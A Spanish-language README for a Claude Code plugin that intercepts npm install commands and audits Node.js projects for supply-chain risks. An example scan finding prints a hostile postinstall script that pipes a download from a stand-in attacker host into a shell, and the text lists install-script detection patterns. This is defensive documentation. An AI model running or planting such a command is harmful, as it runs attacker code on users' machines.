# npm-security

Plugin de seguridad para Claude Code que intercepta comandos npm, mantiene una base de datos de vulnerabilidades alineada con OWASP Top 10 2021 y expone comandos para auditar proyectos Node.js.

---

## Índice

- [Requisitos](#requisitos)
- [Instalación](#instalación)
- [Cómo funciona](#cómo-funciona)
- [Comandos](#comandos)
  - [/security-scan](#security-scan)
  - [/security-list](#security-list)
  - [/update-security](#update-security)
- [Hook pre-ejecución](#hook-pre-ejecución)
- [Base de datos de vulnerabilidades](#base-de-datos-de-vulnerabilidades)
- [Estructura del proyecto](#estructura-del-proyecto)
- [Deshabilitar temporalmente](#deshabilitar-temporalmente)

---

## Requisitos

- **Claude Code** instalado
- **Python 3** con el launcher `py` disponible en PATH
  - Windows: descargar desde [python.org](https://python.org/downloads/) y marcar "Add to PATH"
  - Verificar: `py --version`

---

## Instalación

### Instalación global (recomendada)

Copia los comandos al directorio global de Claude Code y registra el hook:

```bash
# 1. Copiar comandos a ~/.claude/commands/
cp skills/update-security/SKILL.md ~/.claude/commands/update-security.md
cp skills/security-list/SKILL.md    ~/.claude/commands/security-list.md
cp skills/security-scan/SKILL.md    ~/.claude/commands/security-scan.md
cp skills/npm-security/SKILL.md     ~/.claude/commands/npm-security.md

# 2. Agregar el hook en ~/.claude/settings.json
```

`~/.claude/settings.json`:
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "py C:/ruta/a/npm-security/hooks/npm_security_hook.py"
          }
        ]
      }
    ]
  }
}
```

### Instalación por proyecto

Agrega el hook solo para un proyecto específico en `.claude/settings.json` dentro del proyecto. El hook no afectará otros proyectos.

---

## Cómo funciona

El plugin actúa en tres niveles:

```
┌─────────────────────────────────────────────────────┐
│                   Claude Code                       │
│                                                     │
│  1. HOOK (automático)                               │
│     Intercepta npm install/update/add/ci            │
│     antes de ejecutarse → muestra advertencias      │
│                                                     │
│  2. SKILL (automático)                              │
│     Se activa cuando hablas de paquetes npm         │
│     → Claude aplica guías OWASP al responder        │
│                                                     │
│  3. COMANDOS (manual)                               │
│     /security-scan   → audita el proyecto actual    │
│     /security-list   → muestra la DB local          │
│     /update-security → actualiza desde OWASP + NVD  │
└─────────────────────────────────────────────────────┘
```

### Flujo del hook

```
npm install axios
       │
       ▼
 npm_security_hook.py
       │
       ├─ ¿Es un comando npm mutante? (install/update/add/ci)
       │         NO → permite ejecución
       │         SÍ ↓
       ├─ ¿Ya se advirtió sobre este comando en esta sesión?
       │         SÍ → permite ejecución (no interrumpe dos veces)
       │         NO ↓
       ├─ Carga vulnerabilities.json
       ├─ Busca los paquetes del comando en la DB
       │
       ├─ Imprime advertencia con:
       │     • CVEs encontrados
       │     • Categoría OWASP
       │     • Recomendaciones
       │     • Última actualización de la DB
       │
       └─ Bloquea ejecución (exit 2)
             El usuario vuelve a ejecutar el mismo
             comando para confirmar y proceder.
```

---

## Comandos

### /security-scan

Auditoría de seguridad completa del proyecto actual.

```bash
/security-scan
/security-scan --fix
/security-scan --deep
/security-scan --json
/security-scan --deep --json
```

| Argumento | Descripción |
|---|---|
| *(ninguno)* | Análisis estándar: npm audit + DB local + código + config |
| `--fix` | Ejecuta `npm audit fix` para corregir vulnerabilidades fixables |
| `--deep` | **Supply chain completo** — analiza el árbol transitivo entero |
| `--json` | Guarda el reporte en `security-scan-report.json` |
| `--no-code` | Omite el análisis estático de código (más rápido) |

#### Modo estándar — qué analiza

| Sección | Qué hace |
|---|---|
| **[1] npm audit** | Corre `npm audit --json` y lista findings con CVE, severidad y fix disponible |
| **[2] DB local** | Cruza cada dependencia de `package.json` contra `vulnerabilities.json` |
| **[3] Código** | Escanea `.js/.ts/.jsx/.tsx` buscando patrones peligrosos con número de línea |
| **[4] Configuración** | Revisa `.gitignore`, `package.json`, `.npmrc`, `Dockerfile` |

Patrones de código detectados:

| Patrón | Riesgo | OWASP |
|---|---|---|
| `eval(` | Inyección de código | A03:2021 |
| `new Function(` | Inyección de código | A03:2021 |
| `child_process.exec(` | Inyección de comandos | A03:2021 |
| `.innerHTML =` | XSS | A03:2021 |
| `dangerouslySetInnerHTML` | XSS | A03:2021 |
| `http://` en fetch/axios | Transporte inseguro | A02:2021 |
| `console.log.*password\|token` | Exposición de secretos | A02:2021 |
| `Math.random()` para auth | Aleatoriedad débil | A02:2021 |

#### Modo `--deep` — Supply chain completo

Agrega 5 capas de análisis sobre el árbol transitivo completo (`npm ls --all`):

**[5] Install scripts**
Inspecciona los scripts `preinstall`/`postinstall`/`prepare` de **cada paquete en el árbol**, no solo los directos. Marca como CRITICAL si el script contiene `curl`, `wget`, `eval`, `base64`, `process.env`, llamadas HTTP, etc.

```
CRITICAL  malicious-pkg@1.0.0  (depth: 3, via: some-lib → other-lib)
          postinstall: "curl http://evil.com/payload | sh"
```

**[6] Heurísticas de metadata**
Para cada paquete transitivo detecta anomalías:
- Publicado hace menos de 7 días con pocas descargas
- Cambio de maintainer en la última versión publicada
- Salto de versión anormal (ej: 1.0.0 → 10.0.0)
- Paquete creció más del 300% en tamaño respecto a la versión anterior
- Solo 1 maintainer sin historial establecido

**[7] Typosquatting**
Compara todos los paquetes del árbol contra ~30 paquetes populares usando distancia de edición. Detecta nombres como `loadsh`, `expres`, `reacct`, `lo-dash`, etc.

```
HIGH  loadsh@1.0.2  →  probable intención: lodash  (distancia: 1)
```

**[8] Dependency confusion**
Detecta el ataque donde un paquete privado/interno (`@miempresa/utils`) también existe en el registry público de npm. Si npm lo resuelve desde npm público en lugar del registry privado, el atacante controla el código.

```
CRITICAL  @miempresa/internal-utils
          Resuelve desde registry público de npm.
          Fix: agregar en .npmrc → @miempresa:registry=https://tu-registry
```

**[9] Lockfile integrity**
- Verifica que `package-lock.json` existe y tiene `lockfileVersion >= 2`
- Valida hashes de integridad SHA-512 en una muestra de paquetes
- Detecta packages que resuelven desde registries no declarados en `.npmrc`
- Alerta si el lockfile fue modificado manualmente sin reinstalar

#### Output del reporte

```
╔══════════════════════════════════════════════════════════════╗
║              NPM SECURITY SCAN — mi-proyecto                ║
╚══════════════════════════════════════════════════════════════╝
  Date:     2026-04-17
  Project:  mi-proyecto@1.0.0
  Deps:     12 production | 8 dev
  Mode:     deep (full supply chain)
──────────────────────────────────────────────────────────────

── [1] npm audit ──────────────────────────────────────────────
  CRITICAL  0
  HIGH      1
  MEDIUM    2
  LOW       3

  2025-01-15 - Path traversal in express - HIGH
       CVE: CVE-2024-56335  |  Fix: available  |  Path: express

...

  Overall risk:  🔴 HIGH
```

---

### /security-list

Muestra todas las vulnerabilidades de la base de datos local.

```bash
/security-list
/security-list --priority=HIGH
/security-list --package=lodash
/security-list --priority=CRITICAL --limit=10
```

| Argumento | Descripción |
|---|---|
| `--priority=X` | Filtra por nivel: CRITICAL, HIGH, MEDIUM, LOW |
| `--package=X` | Filtra por nombre de paquete (match parcial) |
| `--limit=N` | Limita a N entradas |

Formato de salida — una línea por vulnerabilidad:

```
2025-01-15 - Path traversal in express static middleware - HIGH
2024-09-01 - Prototype pollution in micromatch - HIGH
2024-06-12 - Malware in polyfill.io supply chain attack - CRITICAL
2024-03-29 - Backdoor in XZ Utils — supply chain attack - CRITICAL
2024-01-10 - SSRF in follow-redirects - MEDIUM
2023-06-21 - ReDoS en ws (WebSocket) - HIGH
2022-10-31 - ReDoS in semver - HIGH
2022-03-01 - Command Injection in node-ipc (protestware) - CRITICAL
...
```

Sin filtros también muestra un resumen de cobertura OWASP Top 10:

```
── OWASP Top 10 2021 Coverage ────────────────────────────────
  A01 Broken Access Control        2 entries
  A03 Injection                    4 entries
  A06 Vulnerable Components        5 entries  ← más común
  A08 Software/Data Integrity      4 entries
  A10 SSRF                         2 entries
```

---

### /update-security

Actualiza la base de datos local desde fuentes externas.

```bash
/update-security
/update-security --project-only
```

| Argumento | Descripción |
|---|---|
| *(ninguno)* | Fetch OWASP + GitHub Advisories + npm audit del proyecto actual |
| `--project-only` | Solo corre `npm audit` en el proyecto, sin fetch externo |

Fuentes consultadas:

1. **OWASP Top 10** — verifica si hay una versión más nueva que la 2021
2. **GitHub Advisories** — busca advisories nuevos para el ecosistema npm desde la última actualización de la DB
3. **npm audit** — si hay un `package.json` en el directorio actual, agrega los findings al historial

Output:
```
✅ Security database updated — 2026-04-17

  New vulnerabilities added: 3
  Total entries in DB:       18
  OWASP version:             2021
  Sources checked:
    • OWASP Top 10:         https://owasp.org/www-project-top-ten/
    • GitHub Advisories:    https://github.com/advisories
    • npm audit:            2 new findings

  Recent additions:
  2026-03-10 - Prototype pollution in deep-extend - HIGH
  2026-02-28 - ReDoS in cookie parser - MEDIUM
  2026-01-15 - Supply chain attack in event-source-polyfill - CRITICAL
```

---

## Hook pre-ejecución

El hook intercepta automáticamente los siguientes comandos antes de ejecutarse:

```
npm install   npm i   npm add   npm update   npm up   npm ci
```

Cuando detecta uno de estos comandos:

1. Extrae los nombres de paquetes del comando
2. Los busca en `vulnerabilities.json`
3. Si hay coincidencias, imprime advertencias con CVE, categoría OWASP y referencias
4. **Bloquea la ejecución** — el usuario debe volver a correr el mismo comando para confirmar

La segunda ejecución del mismo comando en la misma sesión se permite sin advertencia.

**Ejemplo:**

```
$ npm install lodash@4.17.20

╔══════════════════════════════════════════════════════════════╗
║           NPM SECURITY GUARD — PRE-EXECUTION CHECK          ║
╚══════════════════════════════════════════════════════════════╝

Command intercepted: npm install lodash@4.17.20

⚠️  KNOWN VULNERABILITIES DETECTED in packages being installed:
  2021-08-31 - Prototype Pollution in lodash merge/set/setWith/zipObjectDeep - HIGH
     └─ CVE: CVE-2020-8203 | OWASP: A03:2021 | Ref: https://nvd.nist.gov/...

── Security Recommendations ──────────────────────────────────
  • Run `npm audit` after install to check for new issues
  • Pin exact versions in package.json to avoid supply-chain drift
  • OWASP Reference: https://owasp.org/www-project-top-ten/
  • Local DB: 15 entries, last updated 2026-04-17

  To proceed, re-run the same npm command.
  To refresh vulnerability data, use: /update-security
──────────────────────────────────────────────────────────────
```

---

## Base de datos de vulnerabilidades

Ubicación: `data/vulnerabilities.json`

Pre-poblada con:
- **OWASP Top 10 2021** — las 10 categorías con relevancia específica para npm
- **15 CVEs reales** de alto impacto en el ecosistema npm (lodash, axios, express, semver, ws, node-ipc, tar, jquery, etc.)
- **Buenas prácticas** — lista de recomendaciones generales

Estructura de cada entrada:

```json
{
  "date": "2025-01-15",
  "vulnerability": "Path traversal in express static middleware",
  "priority": "HIGH",
  "package": "express",
  "version_affected": "< 4.21.2 || >= 5.0.0 < 5.0.1",
  "cve": "CVE-2024-56335",
  "owasp_category": "A01:2021",
  "source": "GitHub Advisory",
  "reference": "https://github.com/advisories/GHSA-qw6h-vgh9-j6wx"
}
```

Niveles de prioridad: `CRITICAL` → `HIGH` → `MEDIUM` → `LOW`

---

## Estructura del proyecto

```
npm-security/
├── .claude-plugin/
│   └── plugin.json              Metadata del plugin (nombre, autor, versión)
├── .claude/
│   └── settings.json            Activa el hook para este proyecto
├── hooks/
│   ├── hooks.json               Configuración del hook PreToolUse
│   └── npm_security_hook.py     Script Python que intercepta npm commands
├── skills/
│   ├── npm-security/
│   │   └── SKILL.md             Skill auto-activada al hablar de paquetes npm
│   ├── security-scan/
│   │   └── SKILL.md             Comando /security-scan
│   ├── security-list/
│   │   └── SKILL.md             Comando /security-list
│   └── update-security/
│       └── SKILL.md             Comando /update-security
├── data/
│   └── vulnerabilities.json     Base de datos local de vulnerabilidades
├── CLAUDE.md                    Instrucciones para Claude Code
└── README.md                    Este archivo
```

---

## Deshabilitar temporalmente

Para desactivar el hook en un comando específico:

```bash
NPM_SECURITY_DISABLED=1 npm install some-package
```

Para desactivarlo permanentemente en un proyecto, eliminar o vaciar el bloque `hooks`
en `.claude/settings.json` de ese proyecto.

---

## Referencias

| Recurso | URL |
|---|---|
| OWASP Top 10 2021 | https://owasp.org/www-project-top-ten/ |
| OWASP A06 — Vulnerable Components | https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/ |
| OWASP A08 — Software Integrity | https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/ |
| GitHub npm Advisories | https://github.com/advisories?query=ecosystem%3Anpm |
| NVD (National Vulnerability Database) | https://nvd.nist.gov/ |
| npm audit docs | https://docs.npmjs.com/cli/commands/npm-audit |
| Dependency confusion attack | https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610 |
| Socket.dev (supply chain monitoring) | https://socket.dev |
